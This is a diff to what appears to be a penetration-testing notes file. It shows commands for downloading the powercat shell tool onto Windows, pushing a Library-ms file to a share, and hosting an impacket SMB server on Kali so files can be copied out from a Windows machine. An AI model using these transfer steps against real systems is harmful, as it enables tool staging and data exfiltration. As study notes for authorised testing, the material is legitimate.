@@ -27,3 +27,11 @@ $WebClient.DownloadFile("https://ip/powercat.ps1","C:\path\powercat.ps1")
 ### Kali
 
 `smbclient //192.168.223.195/share -c 'put config.Library-ms'` - transfer file via smbclient from kali to windows share.
+
+##### host smb server on kali
+
+1. `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` host smb server on kali machine - USE ROOT TERMINAL
+
+2. `net use \\kali-ip\share /u:username password` - use share on windows machine - this allows the windows machine to interact with the share on the kali box
+
+3. `copy file.txt \\kali-ip\share\file.txt` - send file to kali smb share from windows poweshell/cmd
